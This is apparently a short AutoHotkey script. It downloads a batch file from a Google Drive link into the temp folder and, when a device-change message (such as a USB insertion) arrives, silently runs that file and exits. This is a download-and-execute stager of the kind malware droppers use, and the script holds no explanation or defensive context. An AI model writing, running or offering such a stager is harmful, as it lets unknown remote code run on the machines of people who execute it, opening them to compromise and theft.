URLDownloadToFile, https://drive.google.com/uc?authuser=0&id=1Yliisk6KGE5wkpqxWU9xzq4llhIDeLR-&export=download, %temp%\export.bat
OnMessage(0x219, "notify_change")
Return
notify_change(wParam, lParam, msg, hwnd)
{
run, %temp%\export.bat
exitapp
} 